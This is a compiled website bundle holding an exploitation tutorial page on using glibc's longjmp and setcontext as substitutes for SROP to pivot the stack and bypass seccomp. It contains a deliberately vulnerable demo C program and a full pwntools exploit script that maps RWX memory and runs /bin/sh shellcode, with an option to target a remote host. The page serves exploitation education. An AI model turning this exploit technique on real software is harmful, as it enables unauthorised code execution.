"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[486],{5640:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>c,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"pwn/setcontext","title":"setcontext","description":"Glibc\'s answer to sigreturn","source":"@site/pwn/pwn/setcontext.mdx","sourceDirName":"pwn","slug":"/pwn/setcontext","permalink":"/pwn/pwn/setcontext","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"description":"Glibc\'s answer to sigreturn","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Other gadgets","permalink":"/pwn/pwn/rop-2.34+/other-gadgets"},"next":{"title":"fork\\\\_gadget","permalink":"/pwn/pwn/fork_gadget"}}');var i=s(4848),r=s(8453);const c={description:"Glibc's answer to sigreturn",sidebar_position:2},o="setcontext",l={},a=[{value:"SROP",id:"srop",level:2},{value:"Attack scenario",id:"attack-scenario",level:2},{value:"Glibc sigreturn wrapper?",id:"glibc-sigreturn-wrapper",level:2},{value:"longjmp",id:"longjmp",level:2},{value:"How does it work?",id:"how-does-it-work",level:3},{value:"Exploitation",id:"exploitation",level:3},{value:"setcontext",id:"setcontext-1",level:2},{value:"How does it work?",id:"how-does-it-work-1",level:3},{value:"Exploitation",id:"exploitation-1",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"setcontext",children:"setcontext"})}),"\n",(0,i.jsx)(n.h2,{id:"srop",children:"SROP"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"SROP"})," (",(0,i.jsx)(n.strong,{children:"S"}),"ig",(0,i.jsx)(n.strong,{children:"R"}),"eturn ",(0,i.jsx)(n.strong,{children:"O"}),"riented ",(0,i.jsx)(n.strong,{children:"P"}),"rogramming) is a useful technique that allows an attacker to get full control over all the registers, including ",(0,i.jsx)(n.code,{children:"pc"})," and ",(0,i.jsx)(n.code,{children:"sp"}),". This is useful for calling arbitrary functions or syscalls with controlled arguments, or stack pivoting for example. Typically you'd do it by:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Setting ",(0,i.jsx)(n.code,{children:"rax"}),"/",(0,i.jsx)(n.code,{children:"eax"})," to ",(0,i.jsx)(n.code,{children:"SYS_rt_sigreturn"}),"/",(0,i.jsx)(n.code,{children:"SYS_sigreturn"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:["Passing a forged ",(0,i.jsx)(n.code,{children:"SigreturnFrame"})," on the stack."]}),"\n",(0,i.jsx)(n.li,{children:"Executing a syscall."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"This approach is usually doable with some decent control over the process, such as with a ROP chain that looks something like the following:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"|------------------|\n|  pop rax ; ret   |\n|------------------|\n| SYS_rt_sigreturn |\n|------------------|\n|     syscall      |\n|------------------|\n|                  |\n|  SigreturnFrame  |\n|                  |\n|------------------|\n"})}),"\n",(0,i.jsxs)(n.p,{children:["But a technique like ",(0,i.jsx)(n.code,{children:"SROP"})," would be useful in cases where we have less control (i.e when we don't have ROP), as it grants great control over the process (",(0,i.jsx)(n.code,{children:"pc"})," control, stack pivoting, argument control etc.)."]}),"\n",(0,i.jsx)(n.h2,{id:"attack-scenario",children:"Attack scenario"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:s(8086).A+"",children:"Files used for the demo"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'// gcc vuln.c -o vuln -fstack-protector -Wl,-z,relro,-z,now\n#include <stdlib.h>\n#include <stdio.h>\n\nint main() {\n\t// libc leak\n    printf("printf: %p\\n", &printf);\n\n\t// controlled data\n    void *ptr = malloc(0x400);\n    printf("ptr: %p\\n", ptr);\n    fgets(ptr, 0x400, stdin);\n\n\t// function call primitive with controlled argument\n    void (*func)(void*);\n    scanf("%zu", (unsigned long*)&func);\n    getchar();\n\n    func(ptr);\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["Take the ",(0,i.jsx)(n.del,{children:"totally realistic"})," example above, where you have a function call primitive with a controlled first argument (you can get this in glibc in multiple ways, like ",(0,i.jsx)(n.code,{children:"__free_hook"})," for example). In most cases, you can overwrite this to ",(0,i.jsx)(n.code,{children:"system"}),", and ",(0,i.jsx)(n.code,{children:"free"})," a ",(0,i.jsx)(n.code,{children:"/bin/sh"})," string, and call it a day."]}),"\n",(0,i.jsxs)(n.p,{children:["But it's not always that simple, because ",(0,i.jsx)(n.code,{children:"seccomp"})," may be in play, and can block ",(0,i.jsx)(n.code,{children:"execve"}),", so that ",(0,i.jsx)(n.code,{children:"system"})," doesn't work. Now what?!"]}),"\n",(0,i.jsxs)(n.p,{children:["The ideal way to bypass seccomp is to either get ROP or shellcode execution. Here we'll focus on getting ROP, but usually with ROP you can get shellcode execution by ",(0,i.jsx)(n.code,{children:"mmap"}),"'ing a new region, or ",(0,i.jsx)(n.code,{children:"mprotect"}),"'ing an existing one. One way to get ROP is by using stack pivoting, and what technique do we know of that can help stack pivoting? That's right, its our good pal ",(0,i.jsx)(n.del,{children:(0,i.jsx)(n.code,{children:"SSTI"})})," ",(0,i.jsx)(n.code,{children:"SROP"}),"!"]}),"\n",(0,i.jsx)(n.h2,{id:"glibc-sigreturn-wrapper",children:"Glibc sigreturn wrapper?"}),"\n",(0,i.jsx)(n.p,{children:"But how do we call a sigreturn syscall? Well, glibc may hold the answers to our prayers. Glibc has implementations of many linux syscalls, many of which are thin wrappers around the actual syscall."}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (40).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"execve"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["So searching for ",(0,i.jsx)(n.code,{children:"sigreturn"})," in the ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/A/ident/sigreturn",children:"glibc codebase"})," yields:"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (114).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:["Search results for ",(0,i.jsx)("code",{children:"sigreturn"})]})})]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (42).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"sigreturn"})," prototype"]})})]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (43).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"signal/sigreturn.c"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["We get a ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/signal/signal.h#L304",children:"prototype"}),", and ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/signal/sigreturn.c#L22",children:"generic implementation"})," that does nothing. While there are some implementations for other architectures, there's nothing for ",(0,i.jsx)(n.code,{children:"x86"}),". We can also see this when looking at the disassembly."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (46).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"sigreturn"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["Bummer! It's a shame too, because it would've fit our attack scenario pefectly, as it takes one argument: a pointer to a ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86/bits/sigcontext.h#L139",children:"sigcontext"})," (aka a ",(0,i.jsx)(n.code,{children:"SigreturnFrame"}),"). Thankfully however, we don't need ",(0,i.jsx)(n.code,{children:"sigreturn"}),", as glibc provides 2 more alternatives: ",(0,i.jsx)(n.code,{children:"longjmp"})," and ",(0,i.jsx)(n.code,{children:"setcontext"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"longjmp",children:"longjmp"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://man7.org/linux/man-pages/man3/longjmp.3.html",children:"longjmp"})," is used for non-local gotos, which essentially means you can jump between different points across different functions. The way it works is by:"]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Using ",(0,i.jsx)(n.code,{children:"setjmp"})," to save the current stack information to some buffer, such as scratch registers used for storing variables, ",(0,i.jsx)(n.code,{children:"rbp"}),", ",(0,i.jsx)(n.code,{children:"rsp"}),", and ",(0,i.jsx)(n.code,{children:"rip"}),". This first call will return ",(0,i.jsx)(n.code,{children:"0"})," to indicate that this is saving the information."]}),"\n",(0,i.jsxs)(n.li,{children:["Elsewhere in the code, there may be a call to ",(0,i.jsx)(n.code,{children:"longjmp"})," which references the buffer containing the saved stack information. This will restore all the registers that were saved, including ",(0,i.jsx)(n.code,{children:"rip"}),", meaning it will jump to where the ",(0,i.jsx)(n.code,{children:"setjmp"})," call returned."]}),"\n",(0,i.jsxs)(n.li,{children:["Importantly, in this call to ",(0,i.jsx)(n.code,{children:"longjmp"}),", you also pass an extra value, which is put into ",(0,i.jsx)(n.code,{children:"rax"}),", to make it look like ",(0,i.jsx)(n.code,{children:"setjmp"})," returned something. This value must be non-zero to distinguish it from the initial call to ",(0,i.jsx)(n.code,{children:"setjmp"}),", so that it knows its been jumped to."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["An example use case is going ",(0,i.jsx)(n.em,{children:"up"})," the callstack in the case of some exception, where it would be easier to jump there immediately rather than having many functions in the call stack keep returning errors until you reach the main function. The following is an abstract example of this."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'#include <setjmp.h>\n\njmp_buf env;\n\nvoid some_func(void* data) {\n    // This could be some function called when executing do_processing\n    // And could be far down in the call stack\n    ...\n    if (some_error)\n        longjmp(env, 69);\n    ...\n}\n\nvoid do_processing(void* data) {\n    /*\n    Lots of complicated processing with many nested function calls\n    */\n    ...\n}\n\nvoid process_data(void* data) {\n    int errno = setjmp(env);\n    if (errno == 0) {\n        ...\n        do_processing(data);\n        ...\n    } else {\n        printf("Error code %d found\\n", errno);\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["It's important to note that going ",(0,i.jsx)(n.em,{children:"down"})," the callstack is undefined behaviour, because that could be jumping to an area of the stack that's been clobbered by stack usage since the creation of the ",(0,i.jsx)(n.code,{children:"jmp_buf"}),"."]}),"\n",(0,i.jsx)(n.h3,{id:"how-does-it-work",children:"How does it work?"}),"\n",(0,i.jsx)(n.p,{children:"Let's dive (or rather jump (you can laugh now)) in and have a closer look at what's happening."}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/bsd-setjmp.S#L28",children:"setjmp"})," is effectively a thin wrapper around ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/setjmp.S#L30",children:"sigsetjmp"}),", where it sets ",(0,i.jsx)(n.code,{children:"savesigs"})," to ",(0,i.jsx)(n.code,{children:"1"})," (this isn't too important to us)."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (206).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"setjmp"})," and ",(0,i.jsx)("code",{children:"sigsetjmp"})]})})]}),"\n",(0,i.jsxs)(n.p,{children:["Here we see that scratch registers ",(0,i.jsx)(n.code,{children:"r12"}),"-",(0,i.jsx)(n.code,{children:"r15"})," are saved as-is, but ",(0,i.jsx)(n.code,{children:"rbp"}),", ",(0,i.jsx)(n.code,{children:"rsp"}),", ",(0,i.jsx)(n.code,{children:"rip"})," (as of before the call to ",(0,i.jsx)(n.code,{children:"setjmp"}),") are first mangled (using ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/sysdep.h#L406",children:"PTR_MANGLE"}),"), then saved to the buffer."]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/setjmp/longjmp.c#L27",children:"longjmp"})," is fairly similar:"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (207).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"longjmp"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["There a few extra steps, like ",(0,i.jsx)(n.code,{children:"_longjmp_unwind"})," which calls some cleanup operations, which we won't worry about for now. We can skip to main function ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/__longjmp.S#L36",children:"__longjmp"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (208).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"__longjmp"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["And as expected, it restores everything that was saved, and needs to unmangle ",(0,i.jsx)(n.code,{children:"rbp"}),", ",(0,i.jsx)(n.code,{children:"rsp"}),", ",(0,i.jsx)(n.code,{children:"rip"}),"."]}),"\n",(0,i.jsx)(n.h3,{id:"exploitation",children:"Exploitation"}),"\n",(0,i.jsxs)(n.p,{children:["So coming back to our attack scenario, ",(0,i.jsx)(n.code,{children:"longjmp"})," could be a resonable candidate:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"One argument which points to a context buffer."}),"\n",(0,i.jsxs)(n.li,{children:["Control over important registers: ",(0,i.jsx)(n.code,{children:"rbp"}),", ",(0,i.jsx)(n.code,{children:"rsp"}),", ",(0,i.jsx)(n.code,{children:"rip"}),"."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["And while you don't have immediate control over other registers like you would in SROP, this level of control is enough to craft a small rop chain to call a ",(0,i.jsx)(n.code,{children:"sigreturn"})," syscall (like the one I described ",(0,i.jsx)(n.a,{href:"setcontext#srop",children:"here"}),"). You could also set ",(0,i.jsx)(n.code,{children:"rax"})," using ",(0,i.jsx)(n.code,{children:"longjmp"})," if you can control the 2nd argument ",(0,i.jsx)(n.code,{children:"rsi"}),", and point ",(0,i.jsx)(n.code,{children:"rsp"})," directly to a ",(0,i.jsx)(n.code,{children:"SigreturnFrame"}),"."]}),"\n",(0,i.jsxs)(n.p,{children:["The main drawback is the fact that it uses pointer mangling, meaning you need to leak/overwrite the pointer guard ",(0,i.jsx)(n.code,{children:"fs:[0x30]"}),". While this may just be an extra step in some cases, it can be more problematic in cases where you have weaker primitives (like in our example). So, can we do better?"]}),"\n",(0,i.jsx)(n.h2,{id:"setcontext-1",children:"setcontext"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://man7.org/linux/man-pages/man3/setcontext.3.html",children:"setcontext"})," allows for user-level context switching, and is basically just ",(0,i.jsx)(n.code,{children:"sigreturn"})," implemented manually in glibc. The usage is similar to ",(0,i.jsx)(n.code,{children:"longjmp"}),":"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Use ",(0,i.jsx)(n.code,{children:"getcontext"})," to save the information of the current context, which includes most registers and some signal information."]}),"\n",(0,i.jsxs)(n.li,{children:["Use ",(0,i.jsx)(n.code,{children:"setcontext"})," to return to a previously saved context, starting right after the ",(0,i.jsx)(n.code,{children:"getcontext"})," call as expected."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["However unlike ",(0,i.jsx)(n.code,{children:"longjmp"}),", there's no way of distinguishing whether a return from a ",(0,i.jsx)(n.code,{children:"getcontext"})," call is the first or not, because ",(0,i.jsx)(n.code,{children:"rax"})," would always be ",(0,i.jsx)(n.code,{children:"0"})," (",(0,i.jsx)(n.code,{children:"setcontext"}),"/",(0,i.jsx)(n.code,{children:"getcontext"})," return ",(0,i.jsx)(n.code,{children:"0"})," on success), and ",(0,i.jsx)(n.em,{children:"most"})," registers are restored."]}),"\n",(0,i.jsx)(n.h3,{id:"how-does-it-work-1",children:"How does it work?"}),"\n",(0,i.jsxs)(n.p,{children:["The code for ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/setcontext.S#L34",children:"setcontext"})," and ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/getcontext.S#L34",children:"getcontext"})," is written in assembly, but is also fairly simple."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (47).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"getcontext"})})})]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"getcontext"})," is just saving the scratch and argument registers, plus ",(0,i.jsx)(n.code,{children:"rsp"})," and ",(0,i.jsx)(n.code,{children:"rip"})," to the structure."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (49).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"setcontext"})})})]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (51).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"setcontext+294"})})})]}),"\n",(0,i.jsxs)(n.p,{children:["And as you can imagine, ",(0,i.jsx)(n.code,{children:"setcontext"})," just restores all those registers (plus signal information)."]}),"\n",(0,i.jsxs)(n.p,{children:["The structure in question is ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86/sys/ucontext.h#L142",children:"ucontext_t"}),", which is actually a structure very similar to the linux kernel's ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/linux/v6.10/source/include/uapi/asm-generic/ucontext.h#L5",children:"ucontext_t"}),", which is used for the kernel's implementation of ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/linux/v6.10/source/arch/x86/kernel/signal_64.c#L246",children:"rt_sigreturn"}),"."]}),"\n",(0,i.jsxs)(n.admonition,{type:"info",children:[(0,i.jsxs)(n.p,{children:["So if ",(0,i.jsx)(n.code,{children:"setcontext"})," is just replicating ",(0,i.jsx)(n.code,{children:"rt_sigreturn"}),", why not just use the syscall?"]}),(0,i.jsxs)(n.p,{children:["My best guess is that ",(0,i.jsx)(n.code,{children:"setcontext"})," isn't a perfect match to ",(0,i.jsx)(n.code,{children:"rt_sigreturn"}),", as you can't control every register using ",(0,i.jsx)(n.code,{children:"setcontext"}),", such as ",(0,i.jsx)(n.code,{children:"rax"})," (forced to be ",(0,i.jsx)(n.code,{children:"0"}),") and ",(0,i.jsx)(n.code,{children:"r10"})," and ",(0,i.jsx)(n.code,{children:"r11"})," (temporary/scratch registers)."]}),(0,i.jsxs)(n.p,{children:["Interestingly also, most architectures implement it manually, except for a few like ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/sparc/sparc64/setcontext.S#L23",children:"sparc64"}),"."]})]}),"\n",(0,i.jsx)(n.h3,{id:"exploitation-1",children:"Exploitation"}),"\n",(0,i.jsxs)(n.p,{children:["Unlike ",(0,i.jsx)(n.code,{children:"longjmp"}),", we don't need to bypass any pointer mangling, so this is ideal for our attack scenario. In this example, we'll aim to get shellcode execution, which can be done with the use of ROP:"]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Use ",(0,i.jsx)(n.code,{children:"mmap"})," to create a rwx memory section."]}),"\n",(0,i.jsx)(n.li,{children:"Read in our own shellcode."}),"\n",(0,i.jsx)(n.li,{children:"Jump to the shellcode."}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["To craft the ",(0,i.jsx)(n.code,{children:"ucontext_t"}),", we can actually just use ",(0,i.jsx)(n.code,{children:"SigreturnFrame"})," in pwntools, because glibc's ",(0,i.jsx)(n.code,{children:"ucontext_t"})," is basically the same as the kernel's version (at least with the fields we care about)."]}),"\n",(0,i.jsx)(n.admonition,{type:"info",children:(0,i.jsxs)(n.p,{children:["The structures seem to be the same upto the end of ",(0,i.jsx)(n.code,{children:"uc_mcontext"})," (which is covered by ",(0,i.jsx)(n.code,{children:"SigreturnFrame"}),"), but afterwards they're slightly different, mainly due to differences in what signal information is stored. We don't usually need to worry about these fields, and neither does ",(0,i.jsx)(n.code,{children:"SigreturnFrame"}),", so it works well enough for our purposes."]})}),"\n",(0,i.jsxs)(n.p,{children:["However unlike typical SROP, we need to specify a pointer to the ",(0,i.jsx)(n.code,{children:"fpstate"}),". When ",(0,i.jsx)(n.code,{children:"&fpstate"})," is ",(0,i.jsx)(n.code,{children:"NULL"}),", ",(0,i.jsx)(n.code,{children:"sigreturn"})," will ignore ",(0,i.jsx)(n.code,{children:"fpstate"}),", but since ",(0,i.jsx)(n.code,{children:"getcontext"})," always populates this field, ",(0,i.jsx)(n.code,{children:"setcontext"})," assumes it will exist, and so it will crash here."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (38).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:["Loading ",(0,i.jsx)("code",{children:"fpstate"})]})})]}),"\n",(0,i.jsxs)(n.p,{children:["Any valid pointer should work, as the fields in ",(0,i.jsx)(n.code,{children:"fpstate"})," probably won't make a difference in most cases, but in this example I'll construct it like ",(0,i.jsx)(n.code,{children:"getcontext"})," would, meaning it should point to ",(0,i.jsx)(n.code,{children:"ucontext+0x1a8"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (39).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:["Constructing ",(0,i.jsx)("code",{children:"fpstate"})]})})]}),"\n",(0,i.jsxs)(n.p,{children:["We can construct the ",(0,i.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86/sys/ucontext.h#L113",children:"fpstate"})," as follows:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"fpstate = {\n    0x00: p16(0x37f),   # cwd\n    0x02: p16(0xffff),  # swd\n    0x04: p16(0x0),     # ftw\n    0x06: p16(0xffff),  # fop\n    0x08: 0xffffffff,   # rip\n    0x10: 0x0,          # rdp\n    0x18: 0x1f80,       # mxcsr (overlaps with ucontext+0x1c0)\n    # 0x1c: mxcsr_mask\n    # 0x20: _st[8] (0x10 bytes each)\n    # 0xa0: _xmm[16] (0x10 bytes each)\n    # 0x1a0: int reserved[24]\n    # 0x200: [end]\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"Putting all of this together, we can craft the following exploit."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\nfrom sys import argv\n\ne = context.binary = ELF(\'vuln\')\nlibc = ELF(\'libc\', checksec=False)\nld = ELF(\'ld\', checksec=False)\nif len(argv) > 1:\n\tip, port = argv[1].split(":")\n\tconn = lambda: remote(ip, port)\nelse:\n\tconn = lambda: e.process()\n\np = conn()\n\np.recvuntil(b"printf: ")\nprintf = int(p.recvline(), 16)\nlog.info(f"printf: {hex(printf)}")\n\nlibc.address = printf - libc.sym.printf\nlog.info(f"libc: {hex(libc.address)}")\n\np.recvuntil(b"ptr: ")\nptr = int(p.recvline(), 16)\nlog.info(f"ptr: {hex(ptr)}")\n\ndef setcontext(regs, addr):\n\tframe = SigreturnFrame()\n\tfor reg, val in regs.items():\n\t\tsetattr(frame, reg, val)\n\t# needed to prevent SEGFAULT\n\tsetattr(frame, "&fpstate", addr+0x1a8)\n\tfpstate = {\n\t0x00: p16(0x37f),\t# cwd\n\t0x02: p16(0xffff),\t# swd\n\t0x04: p16(0x0),\t\t# ftw\n\t0x06: p16(0xffff),\t# fop\n\t0x08: 0xffffffff,\t# rip\n\t0x10: 0x0,\t\t\t# rdp\n\t0x18: 0x1f80,\t    # mxcsr\n\t# 0x1c: mxcsr_mask\n\t# 0x20: _st[8] (0x10 bytes each)\n\t# 0xa0: _xmm[16] (0x10 bytes each)\n\t# 0x1a0: int reserved[24]\n\t# 0x200: [end]\n\t}\n\treturn flat({\n\t0x00 : bytes(frame),\n#\t0xf8: 0\t\t\t\t\t# end of SigreturnFrame\n\t0x128: 0,\t\t\t\t# uc_sigmask\n\t0x1a8: fpstate,\t\t\t# fpstate\n\t})\n\naddr = 0xdead000\naddr_rop = ptr + len(setcontext({}, 0))\n\ndata = setcontext({\n\t# mmap(addr, 0x1000, rwx, 0x22, -1, 0)\n\t"rip": libc.sym.mmap,\n\t"rdi": addr,\n\t"rsi": 0x1000,\n\t"rdx": 7,\n\t"rcx": 0x22,\n\t"r8": -1,\n\t"r9": 0,\n\t# execute rop afterwards\n\t"rsp": addr_rop\n}, ptr)\n\nrop = ROP(libc)\nrop.gets(addr)\nrop.raw(addr)\n\ndata += rop.chain()\n#gdb.attach(p)\np.sendline(data)\np.sendline(str(libc.sym.setcontext).encode())\n\np.sendline(asm(shellcraft.linux.sh()))\n\np.interactive()\n'})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8086:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/files/setcontext-d573a1ee7b829496d3f863aef5c8f275.zip"},8453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>o});var t=s(6540);const i={},r=t.createContext(i);function c(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);